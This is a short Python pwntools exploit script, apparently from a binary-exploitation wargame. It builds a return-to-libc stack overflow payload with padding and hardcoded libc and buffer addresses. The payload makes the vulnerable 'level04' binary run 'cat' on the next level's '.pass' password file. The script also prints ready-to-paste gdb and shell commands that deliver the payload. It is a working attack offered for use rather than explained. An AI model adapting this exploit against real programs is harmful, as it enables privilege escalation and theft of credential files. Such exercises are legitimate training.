#!/usr/bin/python3
from pwn import *

"""
This script created to help inject shellcode into stack and run our own binary. 
It will assume that environment variables in gdb and sh equal. 
To guarantee this run both your binary and gdb with: 
env -i PWD=$PWD SHELL=$SHELL SHLVL=$SHLVL LINES=211 COLUMNS=53" 
"""


def bytes_to_hex_string(data):
    payload = ''.join([f'\\x{x:02x}' for x in data])
    return payload


def print_gcc_string(shellcode):
    gcc_string = r'run < <(printf "'
    print(gcc_string + bytes_to_hex_string(shellcode) + '")')


def print_shell_string(shellcode):
    shell_string = "python -c 'print(b\""
    env_end = "\")' | env -i PWD=$PWD SHELL=$SHELL SHLVL=$SHLVL LINES=211 COLUMNS=53 /home/users/level04/level04"
    print(shell_string + bytes_to_hex_string(shellcode) + env_end)
    pass


# On start we need to examine binary in gdb and find the address in which fgets writes buffer. Put it here
buffer_start = 0xffffdd60
executable_path = b"cat /home/users/level05/.pass\0"
stack_shift = 156

payload = executable_path.ljust(stack_shift, b'B')
payload += p32(0xf7e6aed0)
payload += p32(0xf7e5eb70)
payload += p32(buffer_start)

print(f"Whole payload length is {len(payload)}")

print()
print('*' * 80)
print("Shellcode:")
print(bytes_to_hex_string(payload))
print()
print("Try gdb with command:")
print_gcc_string(payload)
print("Try in shell with command:")
print_shell_string(payload)

if __name__ != "__main__":
    pass
